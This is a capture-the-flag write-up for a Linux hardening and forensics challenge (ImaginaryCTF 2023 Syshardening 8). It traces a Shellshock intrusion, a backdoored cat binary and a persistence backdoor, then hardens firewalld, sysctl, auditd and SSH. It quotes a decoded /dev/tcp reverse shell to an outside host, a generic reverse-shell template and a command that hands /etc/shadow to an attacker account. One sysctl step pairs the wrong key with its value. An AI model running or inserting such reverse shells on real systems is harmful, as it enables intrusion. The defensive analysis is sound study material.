# __ImaginaryCTF 2023 Syshardening 8 writeup__:
By: Vague (with thanks to Uvuvue, RJCyber, and my CTF team SPL [specifically Donkey and Brayden])
<br>
![meme](https://media.makeameme.org/created/its-hacking-time-b3b763165e.jpg)<br>

# The Challenge
We are given a virtual machine that needs hardening, there are 42 vulnerabilities each worth 1-3 points to add up to 100 points. At the beginning of the competition, you will need 100 points to get the flag. As the competition continues, every two hours the score needed to claim the flag will decrease by 1. This threshold will keep decreasing until the first team attains the flag. By the end of the competition, the needed points was 78.

***note that you start out with a vulnerability "Previous passwords are remembered" already being scored so you have 2 points** 

# Prerequisites
To solve this challenge, you will need to download VMware workstation 17 player. Install the .7z file linked to the challenge and extract this file. Upon extraction open up the .vmx file found within the extracted folder. Upon loading you will be booted up into a Fedora 38 virtual machine with a README file, Scoring Report file, and Forensic Question files on your desktop. This problem requires a multistep solution in which you are required to patch vulnerabilities and answer forensics questions on the image to reach 100. Each vulnerability patched gives a certain amount of points dependent on the difficulty of the vulnerability and each Forensic Question gives a standard 3 points. Upon loading, the first step in securing this image would be to read the ReadMe file on your desktop containing addition information regarding the challenge such as scenario specific configuration requirements.

# The Desktop
Once you've booted up, you can see a desktop containing 10 text files, Forensic Questions, which each contain a question and a spot for the answer. Each Forensic Question correctly answered gives you 3 points. You can also see a quick link to the README, an extremely important file containing scenario specific information that you must follow during your configuration of the machine. Along with this is your ScoringReport which displays the vulnerabilities you have gotten along with their point values and your total score. This image also contains links to root directories but this has little to do with the image and is not important. Here is what the README looks like: https://eth007.me/cypat/syshardening8/
<br>![Alt text](por.PNG)<br>

# Fixing all the broken things
Before we get to the Forensics Questions and eventually the vulnerabilities, there is a lot of things that this image has broken that we must fix or mitigate the effect of so that we may more easily go through it.

## Terminal
When you try to open up the terminal, a key thing needed to secure this system, you are given a weird looking bash prompt that returns an error every time you try to run a command<br>![Alt text](prompt.png)<br>
This is caused by a malicious Konsole profile set as the Default profile for our user running a malicious file /usr/bin/terminal that runs a command to print out a fake bash shell.
We can fix this issue by either:
* Switching to another user and changing our users Konsole profile to run /bin/sh
* Installing another terminal software

Due to it being much easier, I will just install *terminator*, a popular terminal that allows splitting the screen. To do this, open the Software Center application, type terminator in the search bar, scroll down until you see the application called terminator, and click install. <br>![Alt text](2023-07-29_15-05.png)<br>
Now simply click launch and you can run commands!

## Immutable files and chattr
If we run the command ```sudo find / -exec lsattr {} + 2>/dev/null | grep "\---i"```, we observe that many important files are immutable. If we try to change the attributes of any of these files with `chattr` we get put into that bash prompt that doesn't allow any commands to be executed.<br> ![a](2023-07-29_15-13.png)<br>
You can easily upload a good version of chattr to fix this but an easier way I found was to just reinstall Konsole.
Just like with terminator, open the Software Center application, type konsole in the search bar, scroll down until you see the application called Konsole, and click install.<br>![a](2023-07-29_15-17.png)<br>
Now that it is installed, chattr should work properly! To change the attributes of all the immutable files in one command, run:
```for i in $(sudo find /etc -exec lsattr {} + 2>/dev/null | grep "\---i" | awk '{print $2}');do sudo chattr -ia $i;done``` 
Now all we can write to all our important files!
<br>![a](2023-07-29_15-21.png)<br>

## root's aliases 
If you try to run `ls` as root, you will see a train come across the screen, this is likely an alias set in root's .bashrc file.<br>![a](2023-07-29_15-24.png)<br>
To fix this, open up /root/.bashrc in your favorite text editor, and remove the two aliases at the bottom. <br>![a](2023-07-29_15-27.png)<br>
Now close and reopen your terminator terminal to make these changes go into effect.

**There are still more problems that need to be fixed but those aren't relevant now**

<br>

# Forensic Questions

## Forensics Question 1 correct (b8ac3e1c12235ec54580131a511f2c9a) - 3 pts

```text
Greetings, fellow seekers of knowledge! We beckon your expertise on a quest of utmost importance. Deep within the digital
realm, a hidden secret awaits our discovery. In the file /home/frodo/magic_cookie, a key of great significance lies
concealed, encoded in the enigmatic language of hex representation. As esteemed adventurers, it is your noble duty to
embark upon this quest, extracting the key from its cryptic confines. With unwavering determination and keen intellect,
reveal to us the hex-encoded representation of this sacred key. May your endeavors be blessed with success, as together
we unlock the secrets that await within the realms of Middle-earth's digital tapestry.

ANSWER:
```
After reading the question, It seems that we need to find the hex of some key stored in the file `/home/frodo/magic_cookie`
First I will read the contents of this file to hopefully get an idea of where I should start.<br>![a](2023-07-29_15-34.png)<br>
This file contains the readable strings "MIT-MAGIC-COOKIE". After googling this string, we see a Stack Overflow question asking how "X11 authorization works". One of the answers leads us to know what we need to do.<br>![a](2023-07-29_15-37.png)<br>
With this knowledge I will check my current user's(root) xauth file with the command `xauth`, I see that I am using the file `/root/.xauthSLVRP0` as my xauth key. We see in the Stack Overflow answer that you can view the key's hex representation with the command `list` inside of the `xauth` command. To solve this forensics question, I will copy the magical_cookie file to my xauth key file then run the xauth command to view the hex representation. 
<br>
![a](2023-07-29_15-41.png)
<br>
Doing this gives us our answer, **b8ac3e1c12235ec54580131a511f2c9a**

<br>

## Forensics Question 2 correct (CVE-2014-6271) - 3 pts

```text
Alas! The dreadful news has reached our ears. The malevolent presence of the Dark Lord Sauron looms over us, for he has
insidiously infiltrated our very midst. Through his treacherous machinations, he has exploited a most ancient and forgotten
vulnerability to gain access to our sacred realm of the computer. Like a cunning serpent, he has slithered through the
digital shadows, utilizing this exploit as a nefarious key to breach our defenses. I beseech thee, wise one, to reveal
the knowledge of the initial Common Vulnerabilities and Exposures (CVE) identification that pertains to this wickedly
employed exploit. Only through such understanding may we begin to fathom the depths of his dark intentions and devise
a plan to thwart his maleficent schemes.

ANSWER: 
```
After reading this, It appears that an exploit was ran that breached our system. Considering our two attack vectors are SSH and HTTP and SSH has a very little attack surface compared to HTTP, I first check the boa logs.
After reading the logs in **/var/log/boa/access_log**, it appears that someone was Dirbusting the webserver. We can tell this by the user-agent starting with "DirBuster-0.12". 
<br>![a](2023-07-29_15-53.png)<br>
Now Dirbuster only fuzzes directories with a wordlist and does not have the capability to run exploits. To find logs of a potential web exploit, I will search the file for lines that don't contain the Dirbuster User-Agent with the command `cat /var/log/boa/access_log | grep -v "DirBuster-0.12"`. Near the bottom of this output we see someone trying to make a GET request to the cgi binary 'system-info' along with some interesting User-Agent fields that contain commands...<br>![a](2023-07-29_15-58.png)<br>
This is a very old and well-known exploit called Shell Shock. Looking up "shell shock http CVE", we get our answer **CVE-2014-6271**
<br>![a](2023-07-29_16-01.png)<br>

<br>

## Forensics Question 3 correct (1689208527) - 3 pts

```text
With utmost urgency, we must embark upon a thorough investigation into the depths of this exploit that has beset us. As we
tread this treacherous path, let us not falter in our quest for knowledge. Nay, we shall leave no stone unturned and no log
unread in our relentless pursuit of the truth. Pray, enlightened beings, reveal unto us the elusive hour in Unix timestamp
form, when the sinister Sauron, with his malicious intent, exploited our machine. Only by unraveling the fabric of time itself,
represented in those cryptic numerical digits, shall we uncover the dark secret he concealed within the digital tapestry, and
thus forge a defense against his insidious advances. Arise, my companions, and let our combined wisdom shine like a beacon
amidst the shadows of uncertainty!

ANSWER:
```
So it looks like the answer is the time the exploit was ran against our machine in Unix timestamp format. This should be simple because we just saw a log of the exploit occurring with a timestamp. 
<br>
To solve this we will look at the first instance of Shell Shock in `/var/log/boa/access.log` then convert that human readable time (in GMT) to Unix timestamp format.
<br>
Run the command `cat /var/log/boa/access_log | grep "{ :; }" | head -n 1` to get the first instance of the threat actor exploiting Shell Shock, take the timestamp `[13/Jul/2023:00:35:27 +0000]` and convert it to Unix timestamp on a online Unix timestamp converter.
<br>
![Alt text](2023-07-30_18-30.png)
<br>
Thus we get our answer **1689208527**

<br>

## Forensics Question 4 correct (42123) - 3 pts
```text
Ah, the knowledge we seek grows ever more profound! Tell me, in the wake of Sauron's insidious exploit and the planting of his
initial payload, which port does his wicked reverse shell employ? This vital piece of information shall unveil the path through
which his malicious influence infiltrates our digital domain. With our collective wisdom and the power of discernment, we shall
decipher this enigma, unmasking the port that binds Sauron's dark machinations to our noble system. Let our minds unite, valiant
companions, and shed light upon the shadows that cloak his malevolence, for in doing so, we shall fortify our defenses and stand
steadfast against the forces of darkness.

ANSWER:
```
It appears all we need to do is find the port that the threat actor uses in reverse shells and to bind to our system. There are many ways we can find this but we can continue the trend of using the boa logs.
<br>
To gain access to our system with Shell Shock, the threat actor must have sent a reverse shell. Lets examine the commands ran by our threat actor. Again, run the command `cat /var/log/boa/access_log | grep "{ :; }"` to view the commands.
<br>
Reading the status codes of the requests, we see that the final Shell Shock had a status code of `0`. This means that the HTTP request did not complete, AKA it hung...<br>
We can assume this means that the threat actor got a successful reverse shell and thus the web request hung. 
<br>
The command associated with this request is base64 decoding an encoded string then running it with bash. To examine the command bash is running we will base64 decode this string.
<br>![Alt text](2023-07-30_18-43.png)<br>
By running the command `echo L2Jpbi9zaCAtaSA+JiAvZGV2L3RjcC9ldGgwMDcubWUvNDIxMjMgMD4mMQo= | /bin/base64 -d` to base64 decode the string, we see the reverse shell ran by the adversary. Common `/bin/sh` reverse shells follow the format `/bin/sh -i >& /dev/tcp/IP_OF_ATTACKER/PORT_OF_ATTACKER 0>&1`
<br>
![Alt text](2023-07-30_18-48.png)<br>
Following the format, the reverse shell `/bin/sh -i >& /dev/tcp/eth007.me/42123 0>&1` utilizes the port **42123** which is the answer to the forensics question.

<br>

## Forensics Question 5 correct (/usr/lib/nenya) - 3 pts
```text
I bring grave tidings, for within the realms of this system, a file harbors the vulnerability of plaintext passwords. The very
essence of security is at stake. Pray, reveal unto us the absolute path that governs this perilous file, so that we may tread
cautiously and shield these delicate secrets from the prying eyes of malevolent forces. With vigilance and fortitude, let us
ensure the safeguarding of sensitive information, preserving the sanctity of our digital realm and fortifying our defenses
against the lurking shadows of cyber threats.

ANSWER: 
```
This Forensics Question simply asks to find the file that exposes plaintext passwords (of assumedly the users on the system).
<br>
We are only given one password in the ReadMe, `Pa$$w0rd10`, so we will search the file system for this string.
<br>
Because grepping the entire filesystem (`/`) can take an impossibly long time, we will take the more structured approach of grepping individual root directories. 
<br>
We will do this by running the command `grep -rl "Pa\$\$w0rd10" /DIR`. This will recursively grep (grep -r) for the string `Pa$$w0rd10` (Remember, escaping the special characters is crucial and won't work if you don't) in the directory `/DIR` and prints out the full path of a file that contains that string (-l).
<br>
Running this through common root directories eventually lands us with a hit on "/usr"
<br>
![Alt text](2023-07-30_19-09.png)
<br>
Analyzing this file, we see that it is very obviously the plaintext password file we are searching for, making the answer to the Forensics Question **/usr/lib/nenya**

<br>

## Forensics Question 6 correct (1209234) - 3 pts
```text
The treacherous Saruman, in his pursuit of malevolent knowledge, sought to exploit a vulnerability within the noble Boa web
server. In his nefarious efforts to aid Saruman's future exploits, the vile Sauron, with his twisted machinations, meddled
with a key variable that wields influence over the very essence of Boa's operation. Pray, reveal unto us the altered value
to which this variable was tampered, for within its tainted state lies the secret that binds Saruman's dark designs to the
heart of our digital realm. Through our collective wisdom and tireless perseverance, let us restore the integrity of this
variable and ensure the noble Boa web server remains fortified against the forces of darkness that seek to exploit it.

ANSWER: 
```
As it may be to many of you, this forensics question confused me when I first tried tackling it, so lets break it down. There is some variable that was tampered with or changed that effects the "operation" of the boa web server. This could mean a boa configuration change, but it seems to be more likely referring to changing another file that runs or has influence over the boa binary. It seems that the answer to the forensics question is the value of the variable that was changed. 
<br>
The "/etc" directory contains most of the configuration and other important files on the file system. We will start by searching the "/etc" directory for any file that contains the word boa and looking for something out of the ordinary.
<br>
After running the command `grep -rl "boa" /etc/`, we see that the file "/etc/crontab" contains the word boa. This is interesting because crontab runs binaries at a specific time or event. This ability to run the boa web server is exactly what we are looking for.
<br>
![Alt text](2023-07-30_19-23.png)<br>
Upon analyzing this file, we see that upon reboot, root runs the boa binary. Looking at the variables that set the context of the crontab file, we see an interesting value, `GLIBC_TUNABLES=glibc.malloc.mxfast=1209234`, `glibc.malloc.mxfast` is a glibc tunable that affects how fast memory is allocated during certain operations. Because this is set to a very high number, it might lead to excessive memory allocation speed, which could potentially cause resource exhaustion or facilitate certain memory exploitation attacks.
<br>![Alt text](2023-07-30_19-29.png)<br>
Because setting the value of this variable to a high number like "1209234", it makes the answer to our forensics question **1209234**

<br>

## Forensics Question 7 correct (melkor) - 3 pts

```text
Behold, fellow seekers of truth! A dire discovery has come to pass—the very fabric of a key system binary has been tampered
with. Though the mischievous hand that wrought this disturbance has since departed, a lingering enigma remains: What is the
elusive username of the user responsible for the creation of this deceitful contrivance? Together, let us delve into the
annals of our digital realm, unraveling the threads of history and unlocking the secrets that lie dormant within the code.
With steadfast resolve and keen insight, we shall unmask the identity of this elusive figure, ensuring that justice be served
and the foundations of our noble system restored to their rightful state.

ANSWER: 
```
So this forensics question is pretty straight forward. There is an important system binary that has been tampered with and we somehow must find the deleted user that tampered with it. Lets take it one step at a time. 
<br>
So in the earlier steps where we reinstalled Konsole to fix chattr, we inadvertently patched the binary for this Forensics Question. Because of this, we need to install a fresh image and do this forensics question on there. 
<br>
We will be following the second fix to the Konsole terminal discussed earlier as to not patch this binary. To do this, logout of the frodo user on a fresh vm and login as another user (I chose merry), Note: you can logout by pressing ctrl+alt+del and clicking "logout". Now that we are logged in to another user, run Konsole. You will notice that, while the theme of the terminal is different, we are still stuck in a fake bash shell. This is because, although we aren't bound to the theme of frodo anymore, there is an ld preload that checks if bash is in argv and if a certain environment variable set by konsole is present in the command that was injected into every single process running on the system, this includes child processes. So if it detects the env variable set by Konsole as well as the bash binary being ran, it spawns the fake terminal by running `python3 /usr/bin/terminal` (this is a side tangent, more on this later). 
<br>
To fix this, click settings in Konsole, manage profiles, new, then set the Command to /bin/sh. 
<br>![Alt text](2023-07-30_19-52.png)<br>
Click Ok and set the new profile, "Profile 1" as Default. Now reopen Konsole and we get a `sh` prompt that we can run commands on.
<br>
Now the hunt for this tampered binary begins!
<br>
We will first attempt to just run some common binaries and check to see if anything seems out of the ordinary.
<br>
When we attempt to run `cat` our shell gets filled with bash text that won't stop. Seems that we have found our tampered with binary!
<br>![Alt text](2023-07-30_19-55.png)
<br>
Simply exit out of Konsole and go back in to fix this. Now since we can't `cat` the cat binary, lets inspect it with `strings`. <br>
We will run the command `strings /bin/cat | grep -v "^\.\|^_` to check the `cat` binary for strings that don't start with `.` or `_` , strings that are common in compiled binaries.
<br>
Scrolling through this we get an interesting line that appears to run a double base64 decoded string with bash (wonder where we saw hat before).
<br>![Alt text](2023-07-30_20-02.png)<br>
To inspect the command executed by bash, run the command `echo WTJodmQyNGdiV1ZzYTI5eU9tMWxiR3R2Y21BdlpYUmpMM05vWVdSdmR5QXlQaTlrW1hZdmJuVnNiQ0F4UGk5a1pYWXziblZzYkFvPQo= | base64 -d | base64 -d`
<br>
We see that the file `/etc/shadow`, which contains user hashes, is being changed to be owned by the user "melkor"
<br>
![Alt text](2023-07-30_20-08.png)
<br>
This makes the answer to our Forensics Question **melkor**


<br>

## Forensics Question 8 correct (/usr/share/cowsay/cows/fox.cow) - 3 pts

```text
Reveal unto us, with utmost clarity, the absolute path that conceals the tampered file of the beloved cowsay cow. In our
digital domain, where whimsy and mirth intertwine, this cherished companion has fallen victim to wicked tampering. With
steadfast determination and a resolute spirit, guide us towards the sacred location wherein the tampered cowsay cow file
resides. Through the illumination of this absolute path, we shall embark upon a restorative quest, mending the fractured
essence of this delightful bovine and reinstating its joyful presence to our digital abode. Share with us, valiant
companions, the absolute path that unlocks the gate to our restorative endeavors!

ANSWER: 
```
This Forensics Question is straightforward. The answer is the absolute path of a tampered cowsay cow file. 
<br>
To find all the cowsay cow files on the machine, we will search the filesystem for files with the extension ".cow"
<br>
To do this run the command `find / -iname "*.cow" 2>/dev/null`
<br>
 After running this command we observe that all the .cow files are in the default directory of `/usr/share/cowsay/cows/`
 <br>
 ![Alt text](2023-07-31_21-30.png)<br>
 Now you could approach finding the tampered with cowsay file a couple of ways. Firstly you could be lazy and manually search through them but considering there are 45 of them, I don't have the patience for that.
 <br>
 That leads me to the approach I'm going to take. First, I'm going to start up a fresh Fedora 38 machine, install cowsay, and compare these file names to ensure that none of them differ and that there are 45 cowsay files on the fresh machine too.
<br>
![Alt text](2023-07-31_21-36.png)<br>
Now that we've verified that there is the same amount of cowsay files on both machines, instead of manually comparing the names, I will take the lazy approach and see if the filenames are the same character length.
<br> To do this, run the command `find / -iname "*.cow" 2>/dev/null | wc -c` on both systems.
<br>
After running this, we see that sure enough, both systems have (most likely) the same file names due to the output length being 1580 characters each.
<br>
Now our hand has been forced due to the fact that only an individual files contents has been tampered with. 
<br>
To find this, we will first check the lengths of each file on the fresh system and compare them to the lengths of each file on the compromised system.
<br>
To do this, run the command `ls -l /usr/share/cowsay/cows/ | awk '{print $9":"$5}` on the fresh fedora to get a list of `filename:length`.
<br>![Alt text](2023-07-31_21-44.png)<br>
Now we will convert this list into one line using the command `ls -l /usr/share/cowsay/cows/ | awk '{print $9":"$5} | sed 's/^://g' | grep . | tr -d '\n'` and check each line of the output of `ls -l /usr/share/cowsay/cows/ | awk '{print $9":"$5}` on the compromised system to see if any line is not contained in that list.
<br>
Now that already probably doesn't make any sense but the command to do this is even weirder. To do that, run the command `ls -l /usr/share/cowsay/cows/ | awk '{print $9":"$5}' | while IFS= read -r line; do echo "beavis.zen.cow:584blowfish.cow:639bud-frogs.cow:310bunny.cow:123cheese.cow:480cower.cow:230default.cow:175dragon-and-cow.cow:1284dragon.cow:1000elephant.cow:284elephant-in-snake.cow:295eyes.cow:585flaming-sheep.cow:490fox.cow:540ghostbusters.cow:1018head-in.cow:257hellokitty.cow:126kiss.cow:637kitty.cow:296koala.cow:162kosh.cow:406llama.cow:181luke-koala.cow:225mech-and-cow:756meow.cow:473milk.cow:439moofasa.cow:242moose.cow:203mutilated.cow:201ren.cow:252sheep.cow:234skeleton.cow:433small.cow:194stegosaurus.cow:854stimpy.cow:364supermilker.cow:280surgery.cow:892telebears.co^C333three-eyes.cow:293turkey.cow:1302turtle.cow:1105tux.cow:215udder.cow:392vader.cow:279vader-koala.cow:213www.cow:248telebears.cow:333" | grep -Fqv "$line" && echo "$line"; done`
<br>
This checks if each line in the format `filename:length` is not seen in the dump of all the benign `filename:length`'s
<br>
After running this, we get the output: <br>
![Alt text](2023-07-31_21-59.png)<br>
Checking the non default file, we see that instead of a fox, it is a picture of Gollum from The Lord of The Rings<br>![Alt text](2023-07-31_22-00.png)<br>
This means the answer to the Forensics Question is **/usr/share/cowsay/cows/fox.cow**

## Forensics Question 9 correct (jctf{d0nt_believe_every_l0g_u_see}) - 3 pts

```text
Ah, the intrigue of a secret message beckons us! A cryptic revelation lies concealed within the depths of the DNF
(Dandified Yum) history, awaiting our discerning gaze. Pray, share with us the enigmatic message that has been left
behind, nestled amidst the annals of this storied repository. Through our collective wisdom and keen perception, we
shall unravel the veiled words, transcending the barriers of time and code to reveal the hidden truths that yearn
to be discovered. Let us embark upon this quest together, illuminating the path that leads to the heart of this
clandestine message, where enlightenment and revelation await our curious minds.

ANSWER: 
```
This Forensics Question is simple, we need to run the command `dnf history` to view the package install history and our answer should be there.
<br>
Now after trying to run this command, we see that "history" is not a valid dnf plugin and we see a picture of a wizard.
<br>![Alt text](2023-07-31_22-05.png)<br>
<br>
Instead of this being a problem with the history subcommand itself, it seems that dnf is broken.
<br>
To fix this we will simply reinstall dnf's packages manually with a combination of dnf and rpm.
<br>
To fix this, run the commands 
```bash
dnf download dnf --releasever 38
dnf download python3-dnf --releasever 38
dnf download dnf-data --releasever 38
rpm -i dnf-data-4.16.2-1.fc38.noarch.rpm 
dnf builddep python3-dnf --releasever 38
rpm -i python3-dnf-4.16.2-1.fc38.noarch.rpm 
rpm -i dnf-4.16.2-1.fc38.noarch.rpm 
dnf update
```
   and click "y" when prompted.
   <br>
   After doing this, we should be able to run any dnf command, including "dnf history"
   <br>
![Alt text](2023-07-31_22-34.png)
<br>
Doing this shows packages in CTF flag format, which makes our Forensics Question answer **jctf{d0nt_believe_every_l0g_u_see}**
   <br>


## Forensics Question 10 correct (/var/adm/power-manager) - 3 pts

```text
Behold, a foreboding revelation! A treacherous scheme has unfolded, for someone hath surreptitiously sown a hidden backdoor
within our digital realm. As I cast my discerning gaze upon the threads of this malicious design, a flicker of insight
emerges. Methinks this backdoor lurks in the domain of power management, concealing its presence amidst the very currents
that govern the flow of power within our digital abode. With the strength of our collective wisdom and the guiding light
of our shared purpose, we shall embark upon a quest to expose this hidden passage. Together, let us journey through the
labyrinth of code, unearthing the deceit that seeks to undermine our digital fortitude. Fear not, for the combined forces
of our vigilance shall banish this backdoor to the shadows whence it came, restoring the integrity and security of our
noble domain.

ANSWER: 
```
The 10th and final forensics question is asking us to find the location of a backdoored file that seemingly has to do with the power management service.
<br>

### Method 1 - Intended 

So the first thing I do is very simple, I will check for all files that contain the string "powermanagement".
<br>
To do this run the command `find / -iname "*powermanagement*" 2>/dev/null | grep -v ".mo"`
<br>
This searches the file system for filenames that contain the string "powermanagement" and removing the files that are machine object files from the output (grep -v '.mo')
<br>![Alt text](2023-08-02_18-05.png)<br>
There are a few files that get outputted but the first one jumps out.
<br>
It appears to be a config file that changes the power management settings for our user.
<br>
![Alt text](2023-08-02_18-07.png)
<br>
In this file, we see an interesting field called "RunScript" with an interesting variable called "scriptCommand". 
<br>We can assume that at runtime or on an event, it runs that script.... A perfect place for a hacker to inject a backdoor for persistence. 
<br>![Alt text](2023-08-02_18-10.png)<br>
After reading the file, it becomes abundantly clear that it is a backdoor calling out to our threat actor.
<br>
This means the answer to the forensics question is **/var/adm/power-manager**
<br>

### Method 2 - SPEEDRUN

In our previous method, we took the calm, calculated, *intended* approach. 
<br>
This second method is the faster and much easier way to do it.
<br>
In a previous Forensics Question and from previous forensic analysis, we already know the port, IP/Domain Name, and the reverse shell command of the hacker. 
<br>
We could realistically use any of these to do this, but because the threat actor used a domain name, which most likely won't change, and everything else previously mentioned could easily change, we will use that for this.
<br>
As you may have guessed, all we will do is search for the domain name base64 encoded. If this doesn't work we will look for it on its own, and if that doesn't work we will look for it double base64 encoded.
<br>
To do this we will first need to convert the string `eth007.me` to base64. To do this, simply run the command `echo -n "eth007.me" | base64`
<br>
Now we can start grepping the filesystem for this string with the command `grep -rl $(echo -n "eth007.me" | base64) /DIR`
<br>
Using the same methodology of before and searching through root filesystems, we eventually get a hit!
<br>
![Alt text](2023-08-02_18-19.png)<br>
It triggers on the original Shell Shock payload as well as, what we can assume to be, the power management backdoor!!

<br>

# Vulnerabilities
* *note this won't be in the exact order of the scoring report but rather in an order that works better for the image*

## Firewalld service is started - 2 pts
So firstly lets just install firewalld for good measure. Run, `dnf install firewalld -y`
<br>
Now that it is installed, try to start it with `systemctl start firewalld`
<br>
When doing this we get an error saying its masked. Simply run the command `systemctl unmask --now firewalld`
<br>
Now simply enable and start the firewalld service and it should be running!
<br>![Alt text](2023-08-02_18-38.png)<br>

## Firewalld IPv6 spoofing checks enabled - 3 pts

On the subject of firewalld, lets do some firewalld configuration hardening.
<br>
Simply open up `/etc/firewalld/firewalld.conf` and change the variable `IPv6_rpfilter` to be `yes`.<br> It is set to "no" by default but this is insecure and should be changed to "yes"
<br>![Alt text](2023-08-02_18-44.png)<br>

## Firewalld blocks invalid IPv6 to IPv4 traffic - 3 pts
For this next one, we will continue in the file `/etc/firewalld/firewalld.conf` but this time go to the very bottom.
<br>
We will see a variable called `RFC3964_IPv4` which is set to "no" by default but this does not comply with RFC 3964 standard in regards to 6to4 traffic.
<br>
Simply change this to "yes" to get the points!<br>![Alt text](2023-08-02_18-47.png)
<br>

## List of administrators is correct - 1 pts

We will go back to the basics for this one.
<br>
According to the ReadMe, only the user "frodo" should be an administrator, but when we check out who is in the admin group "wheel", we notice there are 3 users that do not belong.
<br>![Alt text](2023-08-02_18-50.png)<br>
Simply edit the file "/etc/group" and remove "samwise, pippin, and merry" from the group "wheel"
<br>

## No users are part of the sys group - 1 pts

This also lies in /etc/group, where there is a non administrator in the 'sys' group
<br>
The sys group is intended to give administrative rights to users within it, and there should not be any non administrators or sometimes no users at all in it.
<br>
In this case, the user "gandalf" is in group "sys"
<br>
Remove him from the group in `/etc/group` to get the points
<br>![Alt text](2023-08-02_18-54.png)<br>

## Sudo does not preserve environment variables - 1 pts

This vulnerability exists in the file `/etc/sudoers` which sets the context for superuser commands and users, mainly by allowing particular users to run various commands as the root user, without needing the root password.
<br>
Open the sudoers file with the command `visudo`
<br>
Near the bottom we see a line that says `Defaults    !env_reset`
<br>
This means that when a command is run as sudo, the environment variables are not reset, allowing essentially unprivileged users access to setting root env variables, leading to a myriad of priv esc techniques. 
<br>
To fix this, simply change the value of `Defaults    !env_reset` to `Defaults    env_reset`
<br>
![Alt text](2023-08-02_20-58.png)
<br>

## Unprivileged users are not allowed access to BPF - 2 pts

The next few vulns will all be configuration changes in sysctl.conf so bear with me.
<br>
This first one is determined by the `kernel.unprivileged_bpf_disabled` variable and can be enabled by making it equal to one. 
<br>
Run the command `echo 'kernel.unprivileged_bpf_disabled = 1' >> /etc/sysctl.conf` to add this control to sysctl and run `sysctl -p` to put this change into effect.
<br>
![Alt text](2023-08-02_21-03.png)<br>

## IPv4 spoofing protection set to strict - 1 pts

This second one is determined by the `net.ipv4.conf.default.rp_filter` variable and can be enabled by making it equal to one. 
<br>
Run the command `echo 'net.ipv4.conf.default.rp_filter = 1' >> /etc/sysctl.conf` to add this control to sysctl and run `sysctl -p` to put this change into effect.
<br>![Alt text](2023-08-02_21-16.png)<br>



## TCP TIME-WAIT assassination protection enabled - 1 pts
This third one is determined by the `net.ipv4.tcp_rfc1337` variable and can be enabled by making it equal to one. 
<br>
Run the command `echo 'net.ipv4.tcp_rfc1337 = 1' >> /etc/sysctl.conf` to add this control to sysctl and run `sysctl -p` to put this change into effect.
<br>![Alt text](2023-08-02_21-22.png)<br>


## Access to the kernel syslog is restricted - 1 pts
This fourth one is determined by the `kernel.dmesg_restrict` variable and can be enabled by making it equal to one. 
<br>
Run the command `echo 'kernel.dmesg_restrict = 1' >> /etc/sysctl.conf` to add this control to sysctl and run `sysctl -p` to put this change into effect.
<br>![Alt text](2023-08-02_21-28.png)<br>


## SUID binaries are not allowed to dump core - 1 pts

This fifth and final one is determined by the `fs.suid_dumpable` variable and can be enabled by making it equal to zero. 
<br>
Run the command `echo 'kernel.dmesg_restrict = 0' >> /etc/sysctl.conf` to add this control to sysctl and run `sysctl -p` to put this change into effect.
<br>![Alt text](2023-08-02_21-36.png)<br>


## Auditd service is started - 2 pts

Now we are finally done with sysctl stuff and have a few Auditd vulnerabilities starting with running the service and then followed up by a couple configuration things.
<br>
To start the auditd service, simply run the command `systemctl start auditd`
<br>![Alt text](2023-08-02_21-38.png)<br>

## Auditd writes logs to disk - 3 pts

Now that the service is starting, we want to enable a few important features in the auditd configuration file.
<br>
Open `/etc/audit/auditd.conf` and change the line `write_logs = no` to `write_logs = yes`. 
<br>
This enables the audit logs to be written to the disk
<br>![Alt text](2023-08-02_21-40.png)<br>





## Auditd logs local events - 3 pts

You might have seen this one at the top of the auditd configuration file from our last vuln, but another glaring "no" is staring us right in the face.
<br>
Open `/etc/audit/auditd.conf` and change the line `local_events = no` to `local_events = yes`.
<br>
This allows us to log local events as well which is obviously important and a good logging best practice.
<br>![Alt text](2023-08-02_21-45.png)<br>


## SSH service is started - 3 pts

Our next onslaught of vulnerabilities will come from the SSH critical service. 
This was specified as a Critical Service by the ReadMe where it also stated some configuration changes it wanted (more on that in the future vulns).
<br>
The SSH service is broken in 2 main ways, both of which the error messages will guide us to.
<br>
Firstly, lets try starting the ssh service and see what happens.<br>![Alt text](2023-08-02_22-01.png)<br>
This error says that the sshd service file is masked. We say a similar thing with firewalld so we know what to do.
<br>
Run the command `systemctl unmask --now sshd` and try to start the service again
<br>
![Alt text](2023-08-02_22-04.png)
<br>
This is an interesting error that is basically telling us that the sshd.service file that systemctl uses to know how to start our service does not work properly.
<br>
This is normally located in `/etc/systemd/system/sshd.service`
<br>
Checking this file, we see that it's running the command `ls` to start the service<br>
![Alt text](2023-08-02_22-05_1.png)<br>
Looking in the file it is pulled from in `/usr/lib`, we see that instead of the ssh binary being ran when the service is started, it runs ls.<br>
![Alt text](2023-08-02_21-54.png)<br>
Because of this, lets just get a good one off of our fresh Fedora machine form earlier.
<br>
On a fresh Fedora, copy the contents of the file `/usr/lib/systemd/system/sshd.service` to `/etc/systemd/system/sshd.service` on our challenge machine.
<br>![Alt text](2023-08-02_21-56.png)<br>
As a good remediation step, add it to /usr/lib/systemd/system/sshd.service too.
<br>
![Alt text](2023-08-02_22-07.png)
<br>
Now we get a different error when we try to start the service.
<br>
This error code doesn't lead us too far so lets check the output of `systemctl status sshd.service`
<br>![Alt text](2023-08-02_22-09.png)<br>
This error code shows that the options supplied to the sshd binary were not valid.
<br>
These configuration options are stored in `/etc/ssh/sshd_config` so we'll check there first.
<br>![Alt text](2023-08-02_22-11.png)<br>
When checking for only the options that are supplied, the problem becomes abundantly clear. There is a random character "a" at the bottom of the file.
<br>
After removing this stray character from the sshd configuration file and trying to start the service again, we see it succeeds!!
<br>![Alt text](2023-08-02_22-13.png)<br>

## SSH root login disabled - 1 pts

Now are the SSH configuration file vulns that are very common and very easy to remediate.
<br>
For this first one, simply change the value `PermitRootLogin yes` to `PermitRootLogin no` in `/etc/ssh/sshd_config`
<br>
This disallows someone logging in through ssh as root. This is insecure because root has inherent superuser permissions so it is best practice to not allow direct root access to any user. Rather, you should use the `sudo` command.
<br>
Save the file and you'll get the points!
<br>
![Alt text](2023-08-02_22-16.png)<br>


## SSH X11 forwarding disabled - 1 pts

Here comes our second simple SSH configuration file vuln. 
<br>
To remediate this one, change the value `X11Forwarding yes` to  `X11Forwarding no` in `/etc/ssh/sshd_config`
<br>
This disables the ability for a connecting client to run a graphical program on the server and forward the display to the client's machine.
<br>
When X11 forwarding is enabled, there may be additional exposure to the server and to client displays if the sshd proxy display is configured to listen on the wildcard address.
